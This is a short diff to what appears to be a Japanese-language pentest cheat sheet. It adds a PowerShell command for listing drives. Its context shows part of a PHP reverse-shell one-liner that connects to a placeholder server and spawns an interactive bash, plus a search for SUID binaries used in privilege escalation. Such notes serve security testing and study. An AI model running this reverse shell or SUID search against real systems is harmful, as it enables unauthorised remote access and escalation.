@@ -58,3 +58,10 @@ php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&
 ```shell
 find / -perm -u=s -type f 2>/dev/null
 ```
+
+### PowerShell
+
+- 論理ドライブの一覧を表示
+```
+Get-PSDrive
+```
